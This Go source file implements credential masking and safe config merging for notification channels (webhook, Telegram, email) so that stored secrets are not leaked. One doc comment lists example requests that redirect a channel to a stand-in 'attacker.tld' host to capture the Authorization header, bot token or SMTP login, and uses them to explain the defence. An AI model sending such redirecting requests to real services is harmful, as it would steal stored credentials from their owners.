package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials it replaces the real content
// with a value carrying this prefix; update endpoints that receive a value with this prefix treat it as "keep the original value unchanged".
//
// Using a prefix instead of an empty string or a fixed constant allows attaching a small recognizable hint
// (see MaskedValue) so users can tell "which bot this is" without re-pasting the key.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              the original value is too short to provide any hint
//	"__masked__:…ab12cd"      includes the last 6 characters of the original value as a hint
//
// Exposing only the last 6 characters is deliberate: the identifying information in Webhook URLs is often at the end
// (such as a WeCom key or Feishu bot id), while the prefix is the same across bots and carries no identifying value.
// The last 6 characters are not enough to recover the credential, but enough for the operator to recognize "this is that channel".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (i.e. not modified after being echoed by the API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with credential fields for the channel replaced by masked values.
//
// Unknown channel types return an empty map instead of the original config—better for the UI to show "configuration unavailable"
// than to echo the entire original content (which may contain credentials) when the channel type is unrecognized.
// Non-credential fields are preserved so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential: declaring per-subkey credential rules
		// for each channel would add complexity far beyond the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates "the destination address changed, but the caller did not
// explicitly state the credential fields". It is returned instead of silently allowing or silently dropping credentials;
// see PrepareConfigUpdate for rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide new values, or explicitly leave empty to indicate no credential is needed. " +
		"The original credentials are valid only for the old address; keeping them would send them to the new address."
}

// PrepareConfigUpdate merges channel configuration and handles the security-sensitive case of "destination address changed".
//
// It replaces bare MergeConfig on channel update paths and addresses this practically exploitable path:
// destination (where messages go) and credentials (what identity is used) are independent fields, and MergeConfig
// preserves original values for any key not mentioned. So anyone who can PATCH a channel can change **only the address
// and say nothing about credentials**, causing the server to send stored real credentials to an attacker-controlled endpoint:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header sent with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent, does not rely on redirects (so rejecting cross-host redirects does not stop it),
// and directly defeats this package's masking goal—"credentials are not echoed to the browser".
//
// Rule: whenever any destination key is changed to a new value, the caller must explicitly state **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential (preserve clearing semantics)
//   - pass the masked value back as-is / omit the key entirely → reject
//
// The third case is also rejected because a "masked value" means "keep the old credential", but old credentials
// are valid only for the old address. This deliberately does not "auto-drop credentials"—for optional credential fields
// (webhook headers, email password) that would silently become "no auth but API returns 200", which is harder to diagnose than an error.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers as an object) contains a masked literal,
	// the caller has embedded the "keep original" sentinel inside a structure. MergeConfig only treats
	// "string with prefix" as masked, so this form would be stored as-is as a plain object—literally writing
	// "__masked__" into storage, silently breaking auth with no error. Reject it.
	//
	// This check must come **first**: when the address is unchanged the function returns early, so placing it
	// later would only cover the "address changed" path.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: normal merge (masked values keep original, empty strings clear, others overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require explicit statement for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a mask sentinel embedded inside a non-string structure.
//
// The masking mechanism assumes "the entire value is a string". For object fields like webhook headers,
// the only valid choices are to mask the whole field (as string "__masked__") or submit the whole field;
// embedding the sentinel inside an object cannot express "keep unchanged" and would be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains mask marker %q: this field can only be left empty as a whole to keep the original value, or submitted as a whole with a new value; a mask placeholder cannot be embedded inside a structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization is used to handle type differences—
// for example the frontend submits a port as a number while storage returns float64, so direct == would misjudge.
//
// "Empty" values must be normalized before comparison: an empty string and "key absent" represent the same state in this
// config model because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization,
// an optional destination field that stays empty (Telegram base_url is the only such field: empty means use the official
// address) would follow this path:
//
//	created with base_url:""  →  first save deleted by MergeConfig
//	→ second save: incoming is "", stored key missing, treated as "address changed"
//	→ credential is masked → 400 "destination address has changed, please re-enter credential fields"
//
// After that every save would fail unless the user re-pasted the Bot Token despite changing nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value is "empty".
// The definition must stay consistent with MergeConfig's clearing rule (strings.TrimSpace(s) == ""),
// otherwise a gap appears where MergeConfig thinks it should delete but sameConfigValue thinks there is a value.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored for updating channel configuration.
//
// Rules:
//   - a masked value in incoming → keep the original value from stored (user did not change this field)
//   - an empty string in incoming → treat as explicit clear, delete the key
//   - other keys → overwrite with the incoming value
//   - keys present in stored but absent in incoming → keep them (partial update semantics)
//
// Whether an empty string means "clear" must be explicit: frontend forms submit unfilled fields as empty strings,
// and treating them as valid values would actually clear fields meant to "keep original by leaving empty".
// Explicit clearing is chosen here because there is no other way for users to clear a mistakenly set field.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}